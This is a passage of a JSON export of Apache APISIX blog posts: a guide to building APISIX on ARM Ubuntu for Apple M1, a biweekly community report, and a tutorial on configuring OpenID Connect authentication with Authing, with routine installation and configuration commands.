code.","date":"2022-01-11T00:00:00.000Z","formattedDate":"January 11, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":4.48,"truncated":true,"authors":[{"name":"Qi Guo","title":"Author","url":"https://github.com/guoqqqi","image_url":"https://avatars.githubusercontent.com/u/72343596?v=4","imageURL":"https://avatars.githubusercontent.com/u/72343596?v=4"}],"prevItem":{"title":"Webinar | From API to Database","permalink":"/blog/2022/01/11/apisix-with-shardingsphere-meetup"},"nextItem":{"title":"Biweekly Report (Dec 16 - Dec 31)","permalink":"/blog/2022/01/05/weekly-report-1231"}},"content":"> By reading this article you will learn how to build Apache APISIX (M1 chip environment) in ARM Ubuntu from source code. The ARM Ubuntu system is installed with the help of [https://multipass.run/](https://multipass.run/).\\n\\n\x3c!--truncate--\x3e\\n\\n## Prerequisites\\n\\n### Clone source code\\n\\nFirst follow the [official documentation](https://apisix.apache.org/docs/apisix/how-to-build/). Clone the Apache APISIX source code repository and go to the project directory.\\n\\n```shell\\ngit clone https://github.com/apache/apisix.git\\ncd apisix\\ngit checkout release/2.11\\n```\\n\\n### Install OpenResty\\n\\nFirst, install the dependencies required for the project in one click via an automation script, running the following command in the **project root** directory.\\n\\n```shell\\nbash utils/install-dependencies.sh\\n```\\n\\n![Installation dependency.png](https://static.apiseven.com/202108/1641911830267-75310d03-1039-4f5a-a8b1-94c01474a086.png)\\n\\nAs you can see from the error message, it is due to the failure to install `OpenResty` successfully. The root cause is that there is no source for the `ARM 64` platform by default.\\n\\nHere we install `OpenResty` manually, the installation steps can be found at [https://openresty.org/cn/linux-packages.html#ubuntu](https://openresty.org/cn/linux-packages.html#ubuntu).\\n\\n#### Step 1: Install the several dependencies required to import the GPG public key\\n\\nSpecific code examples can be found below (you can delete them at any time after the entire installation process is complete).\\n\\n```shell\\nsudo apt-get -y install --no-install-recommends wget gnupg ca-certificates\\n```\\n\\n#### Step 2: Import GPG key\\n\\n```shell\\nwget -O - https://openresty.org/package/pubkey.gpg | sudo apt-key add -\\n```\\n\\nThe import was successful as shown in the figure below.\\n\\n![Import GPG key.png](https://static.apiseven.com/202108/1641911867662-8d1dcb8d-7c1e-4ddd-ad60-2d7448b6c544.png)\\n\\n#### Step 3: Add the official OpenResty APT repository\\n\\nFor x86_64 or amd64 systems, the following command can be used.\\n\\n```shell\\necho \\"deb http://openresty.org/package/ubuntu $(lsb_release -sc) main\\" \\\\\\n    | sudo tee /etc/apt/sources.list.d/openresty.list\\n```\\n\\nFor ARM64 or aarch64 systems, you can use the following command (run on M1 to run the command, the last command will report an error).\\n\\n```shell\\necho \\"deb http://openresty.org/package/arm64/ubuntu $(lsb_release -sc) main\\" \\\\\\n    | sudo tee /etc/apt/sources.list.d/openresty.list\\n```\\n\\n#### Step 4: Update the APT Index\\n\\n```shell\\nsudo apt-get update\\n```\\n\\nAfter that, you can install the software package according to the code below. Here we take `OpenResty` as an example.\\n\\n```shell\\nsudo apt-get -y install openresty\\n```\\n\\n#### Step 5: Delete the corresponding associated package (optional)\\n\\nFinally, we can delete the package and its corresponding associated package with the following command.\\n\\n```shell\\nsudo apt-get -y install --no-install-recommends software-properties-common\\n```\\n\\nSuccessful installation of `OpenResty`.\\n\\n![OpenResty installed successfully.png](https://static.apiseven.com/202108/1641911892167-2a6b56a9-aad8-400b-99d9-8401718c6ba9.png)\\n\\n### Install Dependencies\\n\\nFirst rerun the installation dependency script. Then run the command `LUAROCKS_SERVER=https://luarocks.cn` to install the dependencies.\\n\\n```shell\\nbash utils/install-dependencies.sh\\n```\\n\\n![Install dependency.png](https://static.apiseven.com/202108/1641911909131-3f30b00e-2939-480e-809d-ccd17e5f15c4.png)\\n\\nSimply run the following command.\\n\\n```shell\\ncurl https://raw.githubusercontent.com/apache/apisix/master/utils/linux-install-luarocks.sh -sL | bash -\\n```\\n\\n![Installation dependency feedback.png](https://static.apiseven.com/202108/1641911924788-7e0d2f90-90d6-41cc-8c98-450cdf55a3c1.png)\\n\\nFind the error prompt based on the feedback from the figure above, and then execute the following command.\\n\\n```shell\\nsudo apt install wget sudo unzip\\n```\\n\\nThen we rerun the following command.\\n\\n```shell\\ncurl https://raw.githubusercontent.com/apache/apisix/master/utils/linux-install-luarocks.sh -sL | bash -\\n```\\n\\nFinally, run the installation dependency instruction `LUAROCKS_SERVER=https://luarocks.cn make deps`\\n\\n![Successful installation.png](https://static.apiseven.com/202108/1641911942296-0ed90547-80b3-4e80-be5a-89cf60ba67b4.png)\\n\\nAt this point, most of the dependencies have been successfully installed, but a new error message appears (it looks like the two repositories failed to clone). It doesn\'t matter, it doesn\'t matter for the time being, you can execute the APISIX installation command here.\\n\\n```shell\\nmake install\\n# If you get an insufficient permissions message, use `sudo make install`\\n```\\n\\n![Excute APISIX.png](https://static.apiseven.com/202108/1641911956728-0a64adb1-0bc5-489c-bf5b-929177325ab4.png)\\n\\n## Install etcd\\n\\nBefore starting Apache APISIX you need to install etcd, more details can refer to the [official documentation](https://apisix.apache.org/docs/apisix/2.10/install-dependencies/#ubuntu-1604--1804).\\n\\n:::note\\nBecause the installation tutorial was not written for arm, although etcd, was successfully installed, etcd could not be run successfully due to the default use of x86 binaries. The specific part of stepping on the pit will not be repeated here, but will directly put the correct steps for your reference.\\n:::\\n\\n### Run the etcd in Docker\\n\\n#### Step 1: Install Docker\\n\\n```shell\\nsudo apt install docker.io\\n```\\n\\n:::tip\\nCommon docker commands(add sudo before the command if you get no permission error):\\n\\n- View a list of all containers `docker ps -a`\\n- View the list of running containers `docker ps`\\n- View the list of images `docker image list`\\n- Delete all containers `docker container prune`\\n- Delete all images `docker image prune -f -a`\\n:::\\n\\nMore references can refer to [Docker Getting Started Tutorial - Ruan Yifeng\'s Weblog](https://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html).\\n\\n#### Step 2: Pull and run etcd\\n\\n```shell\\nsudo docker run -d --name etcd -p 2379:2379 -e ETCD_UNSUPPORTED_ARCH=arm64 -e ETCD_LISTEN_CLIENT_URLS=http://0.0.0.0:2379 -e ETCD_ADVERTISE_CLIENT_URLS=http://0.0.0.0:2379 gcr.io/etcd-development/etcd:v3.5.1-arm64\\n```\\n\\nIt should be noted that the proxy needs to be enabled for mirroring in this operation.\\n\\n![Run etcd.png](https://static.apiseven.com/202108/1641912022850-0ad47270-79e2-4227-a786-9d478906b8b0.png)\\n\\n#### Step 3: Verify etcd status\\n\\n```shell\\nsudo docker ps -a\\n```\\n\\n![Verify that etcd is on.png](https://static.apiseven.com/202108/1641912040567-141b520e-4c33-448d-ba33-86e01a9f6114.png)\\n\\nAs you can see, etcd has been successfully started.\\n\\n## Start Apache APISIX\\n\\nAfter doing this, all the dependent projects are now ready, and now you are ready to start Apache APISIX.\\n\\n### Step 1: Install dependencies\\n\\n```shell\\nmake deps\\nmake install\\n```\\n\\n### Step 2: Initialise dependencies and start APISIX\\n\\n```shell\\napisix init\\n\\n# start APISIX\\napisix start\\n\\n# stop APISIX\\napisix stop\\n```\\n\\n![APISIX started successfully.png](https://static.apiseven.com/202108/1641912056163-67b0f11b-a122-4f5b-b7a6-c09662443cce.png)\\n\\nApache APISIX started successfully. For more details on how to install and build Apache APISIX, please see [official documentation](https://apisix.apache.org/docs/apisix/how-to-build).\\n\\n## Summary\\n\\nThrough detailed steps, this article shows you how to deploy and install Apache APISIX under Macbook M1 chip system. In overall practice, there will be some trampling process, but the overall experience is still a successful deployment.\\n\\nIf you have better suggestions, you are welcome to contribute to the Apache APISIX [build documentation](https://apisix.apache.org/docs/apisix/how-to-build/) and leave your suggestions to help more people."},{"id":"Biweekly Report (Dec 16 - Dec 31)","metadata":{"permalink":"/blog/2022/01/05/weekly-report-1231","source":"@site/blog/2022/01/05/weekly-report-1231.md","title":"Biweekly Report (Dec 16 - Dec 31)","description":"The Apache APISIX Community Weekly Report hopes to help community members better understand the weekly progress of the Apache APISIX.","date":"2022-01-05T00:00:00.000Z","formattedDate":"January 5, 2022","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.8,"truncated":true,"authors":[],"prevItem":{"title":"How to build APISIX in ARM Ubuntu","permalink":"/blog/2022/01/11/building-apisix-in-ubuntu-for-arm"},"nextItem":{"title":"Use APISIX and Authing to implement authentication","permalink":"/blog/2022/01/04/authing"}},"content":"> From 12.16 to 12.31, 33 contributors submitted 90 commits for Apache APISIX. Thank you all for your contributions to Apache APISIX.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX has grown as a community from the first day of open source and has quickly become the most active open source API gateway project in the world. These achievements cannot be achieved without the joint efforts of our community partners.\\n\\n\\"If you want to go fast, go alone.If you want to go far, go together.\\" The Apache APISIX Community Weekly Report hopes to help community members better understand the weekly progress of the Apache APISIX community and and facilitate everyone to participate in the Apache APISIX community.\\n\\nWe have also compiled some issues suitable for newcomers to the community to participate in! If you are interested, don\'t miss it!\\n\\n## Contributor Statistics\\n\\n![Contributors List](https://static.apiseven.com/202108/1641356905327-5adada08-1312-4cbd-962b-00d1fcf9ab96.png)\\n\\n![New Contributors](https://static.apiseven.com/202108/1641363865356-97a6e876-97b9-4bda-a0bd-570c4d953faa.png)\\n\\n## Good first issue\\n\\n### Issue #5861\\n\\n**Link**: https://github.com/apache/apisix/issues/5861\\n\\n**Issue description**:\\n\\nSometimes the full CI \\"linux_openresty\\"\\n\\n```YAML\\n- linux_openresty\\n```\\n\\ntakes 50 minutes to complete.\\n\\nLet\'s split it into multiple parts so the max single job time can be reduced.\\n\\nWe can pass an environment variable as the test file range in\\n\\n```Shell\\n FLUSH_ETCD=1 PERL5LIB=.:$PERL5LIB prove -Itest-nginx/lib -r t\\n```\\n\\n### Issue #5900\\n\\n**Link**: https://github.com/apache/apisix/issues/5900\\n\\n**Issue description**:\\n\\nWhen using `base-auth` plugins, I don\'t want to pass the `Authentication` header to upstream.\\nIMO, there is no need for upstream to perceive these authentication headers.\\n\\nNow, I use proxy-rewrite plugin to rewrite the Authentication head like this:\\n\\n```Bash\\n \\"plugins\\": {\\n        \\"basic-auth\\": {},\\n        \\"proxy-rewrite\\": {\\n            \\"headers\\": {\\n                \\"Authorization\\": \\"\\"\\n            }\\n        }\\n    },\\n```\\n\\nI think we can add a config in the `basic-auth` plugin to hide the auth head.\\n\\nThat will be more convenient in using these plugins. So do `key-auth` plugin.\\n\\n## Highlights of Recent Features\\n\\n- [Completed the controller loop and related logic for the ApisixPluginConfig custom resource. Released in APISIX Ingress controller v1.4](https://github.com/apache/apisix-ingress-controller/pull/815)\uff08Contributor: [neverCase](https://github.com/neverCase)\uff09\\n\\n- [The limit-count plugin supports shared counters](https://github.com/apache/apisix/pull/5881)\uff08Contributor: [spacewander](https://github.com/spacewander)\uff09\\n\\n- [Add degradation switch for ext-plugin](https://github.com/apache/apisix/pull/5897)\uff08Contributor: [arabot777](https://github.com/arabot777)\uff09\\n\\n- [Support to use path parameter with plugin\'s control api](https://github.com/apache/apisix/pull/5934)\uff08Contributor: [The-White-Lion](https://github.com/The-White-Lion)\uff09\\n\\n- [Support send APISIX data to assist decision in OPA plugin](https://github.com/apache/apisix/pull/5874)\uff08Contributor: [bzp2010](https://github.com/bzp2010)\uff09\\n\\n- [Allow setting proxy_request_buffering without disabling proxy-mirror](https://github.com/apache/apisix/pull/5943)\uff08Contributor: [spacewander](https://github.com/spacewander)\uff09\\n\\nThe Apache APISIX project website and the Github issue have accumulated a wealth of documentation and experience, so if you encounter problems, you can read the documentation, search the issue with keywords, or participate in the discussion on the issue to put forward your own ideas and practical experience.\\n\\n## Recent Blog Recommendations\\n\\n- [Apache APISIX Integrates with Google Cloud Logging to Improve Log Processing](https://apisix.apache.org/blog/2021/12/22/google-logging)\uff1a\\n\\n  This article will explain how to configure and use the Google Cloud Logging service in Apache APISIX.\\n\\n- [Apache APISIX integrates with Open Policy Agent to enrich its ecosystem](https://apisix.apache.org/blog/2021/12/24/open-policy-agent)\uff1a\\n\\n  This article introduces the opa plug-in as an example of HTTP API and details how to integrate Apache APISIX with OPA to decouple the authentication authorization of back-end services.\\n\\n- [Coming soon! Apache APISIX Integrate with Apache OpenWhisk](https://apisix.apache.org/blog/2021/12/24/apisix-integrate-openwhisk-plugin)\uff1a\\n\\n  This article introduces the feature prospect and usage steps of the openwhisk plug-in, which is combined with a variety of identity authentication plug-ins provided by Apache APISIX to achieve authentication and authorization and other functions.\\n\\n- [Using the Apache APISIX proxy gRPC service](https://apisix.apache.org/blog/2021/12/30/apisix-proxy-grpc-service)\uff1a\\n\\n  This article shows you how to proxy client HTTP traffic to the back-end gRPC service via the grpc-transcode plugin in Apache APISIX."},{"id":"Use APISIX and Authing to implement authentication","metadata":{"permalink":"/blog/2022/01/04/authing","source":"@site/blog/2022/01/04/authing.md","title":"Use APISIX and Authing to implement authentication","description":"This article shows the details of centralized authentication and how to use Authing in Apache APISIX.","date":"2022-01-04T00:00:00.000Z","formattedDate":"January 4, 2022","tags":[{"label":"Plugins","permalink":"/blog/tags/plugins"},{"label":"Authentication","permalink":"/blog/tags/authentication"},{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":8.15,"truncated":true,"authors":[{"name":"Xinxin Zhu","title":"Author","url":"https://github.com/starsz","image_url":"https://avatars.githubusercontent.com/u/25628854?v=4","imageURL":"https://avatars.githubusercontent.com/u/25628854?v=4"},{"name":"Yilin Zeng","title":"Technical Writer","url":"https://github.com/yzeng25","image_url":"https://avatars.githubusercontent.com/u/36651058?v=4","imageURL":"https://avatars.githubusercontent.com/u/36651058?v=4"}],"prevItem":{"title":"Biweekly Report (Dec 16 - Dec 31)","permalink":"/blog/2022/01/05/weekly-report-1231"},"nextItem":{"title":"Use API gateway to proxy gRPC service","permalink":"/blog/2021/12/30/apisix-proxy-grpc-service"}},"content":"> This article shows the details of centralized authentication and how to use Authing in Apache APISIX.\\n\\n\x3c!--truncate--\x3e\\n\\n![APISIX-Authing Cover](https://static.apiseven.com/202108/1641346620900-ece258db-b9fe-44bf-9857-4ea5c0151138.png)\\n\\n## Introduction\\n\\n### About Apache APISIX\\n\\n[Apache APISIX](https://github.com/apache/apisix) is a dynamic, real-time, high-performance API gateway that provides rich traffic management features such as load balancing, dynamic upstream, canary release, service meltdown, authentication, observability, etc. Apache APISIX not only supports dynamic plug-in changes and hot-plugging, but also has a number of useful plug-ins.OpenID Connect Plug-in for Apache APISIX With support for the OpenID Connect protocol, users can use this plug-in to enable Apache APISIX to interface with Authing services and be deployed as a centralized authentication gateway in the enterprise.\\n\\n### About Authing\\n\\n[Authing](https://www.authing.cn/) is the first developer-centered full-scene identity cloud product in China, integrating all mainstream identity protocols and providing complete and secure user authentication and access management services for enterprises and developers. With \\"API First\\" as the cornerstone of the product, all common functions in the identity field are modularly encapsulated, and all capabilities are APIed to developers through a full-scene programming language SDK. At the same time, users can flexibly use Authing\'s open RESTful APIs for functional expansion to meet the identity management needs of different enterprises in different business scenarios.\\n\\n## What is Centralized Authentication\\n\\n### Traditional Authentication Mode\\n\\nIn the traditional authentication mode, each back-end application service needs to develop separate functions to support the authentication function, such as interacting with the identity provider and obtaining the user\'s identity information.\\n\\n![traditional authentication work flow](https://static.apiseven.com/202108/1639467045776-715e1805-540b-4cef-87c5-6166e2af43a8.png)\\n\\n### Centralized Identity Authentication Mode\\n\\nUnlike the traditional authentication mode, the centralized authentication mode takes the user authentication out of the application service. Take Apache APISIX as an example, the process of centralized authentication is shown in the figure above: first, the user initiates a request, and then the front gateway is responsible for the user authentication process, interfacing with the identity provider and sending an authorization request to the identity provider. The identity provider returns the user information. After the gateway completes user identification, it forwards the user identity information to the back-end application in the form of a request header.\\n\\n![centralized authentication mode work flow](https://static.apiseven.com/202108/1641346655710-3b9b2ebf-cc86-4335-a87a-913724e0300a.png)\\n\\n### Advantages of Centralized Identity Authentication Mode\\n\\nCompared with the traditional authentication mode, the centralized authentication mode has the following advantages.\\n\\n1. Simplify the application development process, reduce the development of application workload and maintenance costs, and avoid repeated development of authentication logic for each application.\\n2. Improve business security, centralized authentication mode at the gateway level can intercept unauthenticated requests in time to protect back-end applications.\\n\\nAt the same time, combined with Authing\'s powerful authentication management functions, the following functions can be achieved.\\n\\n1. Lifecycle management of authentication services through the console, including creation, enablement, disablement, etc.\\n2. Real-time, visual application monitoring, including: the number of interface requests, interface call latency and interface error information, and real-time alarm notification.\\n3. Centralized logging to easily view user login, logout, and information about adjustments and modifications to the application.\\n\\nMore details can be found in [Authing Access Gateway](https://www.authing.cn/gateway-integration).\\n\\n## How to implement Centralized Identity Authentication using Apache APISIX and Authing\\n\\n### Step 1: Configure Authing\\n\\n1. Login to your Authing account, select Build your own app and fill in the app name and authentication address. If you do not have an Authing account, please visit [Authing](https://www.authing.cn/), click on \\"Login/Register\\" in the upper right corner to register an Authing account.\\n  ![Configure Authing](https://static.apiseven.com/202108/1641346693124-65b10c31-99e3-4e0c-85e2-85653656e0cc.png)\\n\\n2. Click Create to create an Authing application.\\n  ![Creating an Authing Application](https://static.apiseven.com/202108/1641346725153-4159407e-2706-4178-b793-7c99973ef95f.png)\\n\\n3. During the authentication process, Authing will reject callback URLs other than the configured ones. Since this is a local test, the login callback URL and the logout callback URL are both set to the APISIX access address http://127.0.0.1:9080/.\\n  ![Set the URL for login and logout](https://static.apiseven.com/202108/1641346772276-6bd879ad-0047-496e-9868-b46bfe3e596d.png)\\n\\n4. Create user (optional). On the user list page, create a user with the account password user1/user1, and you can set whether to allow access to the application in the \\"User Information - Authorization Management\\" page (the default is to allow).\\n  ![Create User](https://static.apiseven.com/202108/1641346792309-01e1d853-247f-4691-bd56-55d899849331.png)\\n  ![Setting Access Permissions](https://static.apiseven.com/202108/1641346815891-ff43a29e-2994-4680-bec5-f2553e520d31.png)\\n\\n5. Visit the application page for the following configuration, which is required when configuring Apache APISIX OpenID Connect.\\n   1. App ID: OAuth client ID, i.e. the ID of the application, corresponding to `client_id` and `{YOUR_CLIENT_ID}` below.\\n   2. App secret: OAuth client secret, i.e. the application key. Corresponds to `client_secret` and `{YOUR_CLIENT_SECRET}` below.\\n   3. Service_discovery_address: The address of the application service discovery. Corresponds to `{YOUR_DISCOVERY}` below.\\n  ![configurations](https://static.apiseven.com/202108/1641347262557-04949c02-e4bc-4a74-b100-4668e85087ee.png)\\n\\n### Step 2: Install Apache APISIX\\n\\nYou can install Apache APISIX in a variety of ways including source packages, Docker, Helm Chart, etc.\\n\\n#### Install dependencies\\n\\nThe Apache APISIX runtime environment requires dependencies on NGINX and etcd.\\n\\nBefore installing Apache APISIX, please install dependencies according to the operating system you are using. We provide the dependencies installation instructions for CentOS7, Fedora 31 and 32, Ubuntu 16.04 and 18.04, Debian 9 and 10, and macOS. Please refer to [Install Dependencies](https://apisix.apache.org/docs/apisix/install-dependencies/) for more details.\\n\\n#### Installation via RPM Package (CentOS 7)\\n\\nThis installation method is suitable for CentOS 7; please run the following command to install Apache APISIX.\\n\\n```shell\\nsudo yum install -y https://github.com/apache/apisix/releases/download/2.7/apisix-2.7-0.x86_64.rpm\\n```\\n\\n#### Installation via Docker\\n\\nPlease refer to [Installing Apache APISIX with Docker](https://hub.docker.com/r/apache/apisix).\\n\\n#### Installation via Helm Chart\\n\\nPlease refer to [Installing Apache APISIX with Helm Chart](https://github.com/apache/apisix-helm-chart).\\n\\n#### Installation via source release\\n\\n1. Create a directory named `apisix-2.7`.\\n\\n```shell\\nmkdir apisix-2.7\\n```\\n\\n2. Download Apache APISIX Release source package.\\n\\n```shell\\nwget https://downloads.apache.org/apisix/2.7/apache-apisix-2.7-src.tgz\\n```\\n\\nYou can also download the Apache APISIX release source package from the Apache APISIX website. The [Apache APISIX Official Website - Download Page](https://apisix.apache.org/downloads/) also provides source packages for Apache APISIX, APISIX Dashboard, and APISIX Ingress Controller.\\n\\n3. Unzip the Apache APISIX Release source package.\\n\\n```shell\\ntar zxvf apache-apisix-2.7-src.tgz -C apisix-2.7\\n```\\n\\n4. Install the runtime-dependent Lua libraries.\\n\\n```shell\\n# Switch to the apisix-2.7 directory\\ncd apisix-2.7\\n# Create dependencies\\nmake deps\\n```\\n\\n#### Initializing Dependencies\\n\\nRun the following command to initialize the NGINX configuration file and etcd.\\n\\n```shell\\n# initialize NGINX config file and etcd\\nmake init\\n```\\n\\n### Step 3: Start Apache APISIX and configure route\\n\\n1. Run the following command to start Apache APISIX.\\n\\n   ```shell\\n   apisix start\\n   ```\\n\\n2. Create routes and configure the OpenID Connect plug-in. the OpenID Connect configuration list is as follows.\\n\\n|Field|Default Value|Description|\\n|:--------|:--------|:---------------|\\n|client_id|N/A|OAuth client ID|\\n|client_secret|N/A|OAuth client secret key|\\n|discovery|N/A|Service discovery endpoints for identity providers|\\n|scope|openid|Need to access resource scope|\\n|relm|apisix|Specify the WWW-Authenticate response header authentication information|\\n|bearer_only|false|Whether to check the token in the request header|\\n|logout_path|/logout|Logout URI|\\n|redirect_uri|request_uri|The URI that the identity provider bounces back to, defaulting to the request address|\\n|timeout|3|Request timeout time in seconds|\\n|ssl_verify|false|Whether the identity provider\'s checksum ssl certificate|\\n|introspection_endpoint|N/A|The URL of the identity provider\'s token authentication endpoint, which will be extracted from the discovery response if left blank.|\\n|introspection_endpoint_auth_method|client_secret_basic|Name of the authentication method for token introspection|\\n|public_key|N/A|Public key for authentication token|\\n|token_signing_alg_values_expected|N/A|Algorithm for authentication tokens|\\n|set_access_token_header|true|Whether to carry the access token in the request header|\\n|access_token_in_authorization_header|false|The access token is placed in the Authorization header when true, and in the X-Access-Token header when false.|\\n|set_id_token_header|false|No to carry the ID token to the X-ID-Token request header|\\n|set_userinfo_header|false|Whether to carry user information in the X-Userinfo request header|\\n\\nThe following code example creates a route through the Apache APISIX Admin API, setting the route upstream to [httpbin.org](http://httpbin.org). `httpbin.org` is a simple backend service for receiving and responding to requests, the `get` page of `httpbin.org` will be used below, refer to [http bin get](http://httpbin.org/#/HTTP_Methods/get_get).\\n\\nFor specific configuration items, please refer to [Apache APISIX OpenID Connect Plugin](https://apisix.apache.org/zh/docs/apisix/plugins/openid-connect/).\\n\\n```shell\\ncurl  -XPOST 127.0.0.1:9080/apisix/admin/routes -H \\"X-Api-Key: edd1c9f034335f136f87ad84b625c8f1\\" -d \'{\\n    \\"uri\\":\\"/*\\",\\n    \\"plugins\\":{\\n        \\"openid-connect\\":{\\n            \\"client_id\\":\\"{YOUR_CLIENT_ID}\\",\\n            \\"client_secret\\":\\"{YOUR_CLIENT_SECRET}\\",\\n            \\"discovery\\":\\"https://{YOUR_DISCOVERY}\\",\\n            \\"scope\\":\\"openid profile\\",\\n            \\"bearer_only\\":false,\\n            \\"realm\\":\\"apisix\\",\\n            \\"introspection_endpoint_auth_method\\":\\"client_secret_post\\",\\n            \\"redirect_uri\\":\\"http://127.0.0.1:9080/\\"\\n        }\\n    },\\n    \\"upstream\\":{\\n        \\"type\\":\\"roundrobin\\",\\n        \\"nodes\\":{\\n            \\"httpbin.org:80\\":1\\n        }\\n    }\\n}\'\\n```\\n\\n### Step 4: Access Apache APISIX\\n\\n1. Visit \\"http://127.0.0.1:9080/get\\" and the page is redirected to the Authing login page as the OpenID Connect plugin is already enabled (this page can be customized in the Authing console under \\"Applications - Branding\\").\\n  ![ Access Apache APISIX](https://static.apiseven.com/202108/1641347039112-252cadee-7766-48e8-b33c-b7aa0769bb22.png)\\n\\n2. Enter the password for the user\'s account registered with Authing, or the user user1/user1 created in Step 1, and click Login to log in to the Authing account.\\n\\n3. After a successful login, you can successfully access the get page in httpbin.org. The httpbin.org/get page will return the requested data as follows.\\n\\n    ```shell\\n    ...\\n    \\"X-Access-Token\\": \\"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InFqeU55aVdVd2NhbUFxdEdVRUNCeFNsTWxQSWtTR2N1NmkyZzhEUk1OSGsifQ.eyJqdGkiOiJjTy16a0pCS0NSRFlHR2kyWkJhY0oiLCJzdWIiOiI2MWM5OGFmOTg0MjI4YWU0OTYyMDU4NTIiLCJpYXQiOjE2NDA1OTg4NTgsImV4cCI6MTY0MTgwODQ1OCwic2NvcGUiOiJvcGVuaWQgcHJvZmlsZSIsImlzcyI6Imh0dHBzOi8vYXBpc2l4LmF1dGhpbmcuY24vb2lkYyIsImF1ZCI6IjYxYzk4M2M0YjI4NzdkNDg2OWRkOGFjYiJ9.l2V8vDWcCObB1LjIhKs2ARG4J7WuB-0c-bnYZG2GP2zcpl6PMAPcId2B76CaXCU58ajGcfRmOlWJ67UaHrfWKv8IM4vcYN1gwhKdokSyrhEM31gQE-MzNEsEbPaVIGXdpR1N2JnAJK5-tKIjopDAXSwArfO6fQKTpjLhCi3COIA169WGRR4CKCwNzzpFAYP2ilNc18D_HRTBLS6UjxZSNUtWE5dbx7uBjblhwIwn5e1fxiEQcknVK8Dxf8NUliFECvr02HX2hNvmuCECkvA_mZYlshAeqidK8tSEXirAWsWS5jlXFqLiBJkhSHFrbxRyqeOSfJCJR_YcCwk9AzgZGg\\",\\n    \\"X-Id-Token\\": \\"eyJhdF9oYXNoIjoiRl8tRjZaUVgtWVRDNEh0TldmcHJmUSIsImJpcnRoZGF0ZSI6bnVsbCwiZmFtaWx5X25hbWUiOm51bGwsImdlbmRlciI6IlUiLCJnaXZlbl9uYW1lIjpudWxsLCJpc3MiOiJodHRwczpcL1wvYXBpc2l4LmF1dGhpbmcuY25cL29pZGMiLCJwaWN0dXJlIjoiaHR0cHM6XC9cL2ZpbGVzLmF1dGhpbmcuY29cL2F1dGhpbmctY29uc29sZVwvZGVmYXVsdC11c2VyLWF2YXRhci5wbmciLCJwcmVmZXJyZWRfdXNlcm5hbWUiOm51bGwsInVwZGF0ZWRfYXQiOiIyMDIxLTEyLTI3VDA5OjU0OjE3Ljc3M1oiLCJ3ZWJzaXRlIjpudWxsLCJ6b25laW5mbyI6bnVsbCwibmFtZSI6bnVsbCwiaWF0IjoxNjQwNTk4ODU4LCJuaWNrbmFtZSI6bnVsbCwibm9uY2UiOiJmMTlmZjhjODM5NzdmZjNlMDczMzZmMzg3Y2QxM2EzMSIsIm1pZGRsZV9uYW1lIjpudWxsLCJleHAiOjE2NDE4MDg0NTgsInN1YiI6IjYxYzk4YWY5ODQyMjhhZTQ5NjIwNTg1MiIsImxvY2FsZSI6bnVsbCwiYXVkIjoiNjFjOTgzYzRiMjg3N2Q0ODY5ZGQ4YWNiIiwicHJvZmlsZSI6bnVsbH0=\\",\\n    \\"X-Userinfo\\": \\"eyJ3ZWJzaXRlIjpudWxsLCJ6b25laW5mbyI6bnVsbCwibmFtZSI6bnVsbCwicHJvZmlsZSI6bnVsbCwibmlja25hbWUiOm51bGwsInN1YiI6IjYxYzk4YWY5ODQyMjhhZTQ5NjIwNTg1MiIsImxvY2FsZSI6bnVsbCwiYmlydGhkYXRlIjpudWxsLCJmYW1pbHlfbmFtZSI6bnVsbCwiZ2VuZGVyIjoiVSIsImdpdmVuX25hbWUiOm51bGwsIm1pZGRsZV9uYW1lIjpudWxsLCJwaWN0dXJlIjoiaHR0cHM6XC9cL2ZpbGVzLmF1dGhpbmcuY29cL2F1dGhpbmctY29uc29sZVwvZGVmYXVsdC11c2VyLWF2YXRhci5wbmciLCJwcmVmZXJyZWRfdXNlcm5hbWUiOm51bGwsInVwZGF0ZWRfYXQiOiIyMDIxLTEyLTI3VDA5OjU0OjE3Ljc3M1oifQ==\\"\\n    ...\\n    ```\\n\\n    **X-Access-Token**: Apache APISIX puts the access token obtained from the user provider into the `X-Access-Token` request header, optionally in the Authorization request header via `access_token_in_authorization_header` in the plugin configuration.\\n\\n    ![X-Access-Token](https://static.apiseven.com/202108/1641278494765-139b6ffc-227b-4f02-8b2a-45d762422e15.png)\\n\\n    **X-Id-Token**: Apache APISIX puts the ID token obtained from the user provider into the X-Id-Token request header after base64 encoding, which can be enabled or disabled by `set_id_token_header` in the plugin configuration.\\n\\n    ![X-Id-Token](https://static.apiseven.com/202108/1641278494768-867dadf3-8ecd-4376-af03-d86b6a7aa698.png)\\n\\n    **X-Userinfo**: Apache APISIX puts the user information obtained from the user provider into X-Userinfo after encoding it in base64. You can choose whether to enable this feature by using `set_userinfo_header` in the plugin configuration.\\n\\n    ![X-Userinfo](https://static.apiseven.com/202108/1641278494771-42567d0c-8424-46e2-9c5b-a12cf1af6bc8.png)\\n\\n    As you can see, Apache APISIX will carry `X-Access-Token`, `X-Id-Token` and `X-Userinfo` request headers to the upstream. The upstream can parse these headers to get the user ID information and the user metadata.\\n\\n4. In the \\"Audit Log - User Behavior Log\\" in the Authing console, you can observe that user1 login information.\\n  ![Login Information](https://static.apiseven.com/202108/1641347080382-c769eba0-d7f3-490a-bf56-66189f2026a3.png)\\n\\n## Summary\\n\\nThis article describes the detailed steps for interfacing Apache APISIX with Authing.\\n\\nApache APISIX is not only committed to maintaining its own high performance, but also has always attached great importance to the construction of open source ecology. At present, Apache APISIX has 10+ authentication authorization-related plug-ins that support interfacing with mainstream authentication authorization services in the industry.\\n\\nIf you have a need to interface to other authentication authorities, visit Apache APISIX\'s [GitHub](https://github.com/apache/apisix/issues) and leave your suggestions via issue; or subscribe to Apache APISIX\'s [mailing list](https://apisix.apache.org/zh/docs/general/join) to express your thoughts via email."},{"id":"Use API gateway to proxy gRPC service","metadata":{"permalink":"/blog/2021/12/30/apisix-proxy-grpc-service","source":"@site/blog/2021/12/30/apisix-proxy-grpc-service.md","title":"Use API gateway to proxy gRPC service","description":"This article shows you how to proxy client HTTP traffic to the back-end gRPC service via the `grpc-transcode` plugin in API Gateway Apache APISIX.","date":"2021-12-30T00:00:00.000Z","formattedDate":"December 30, 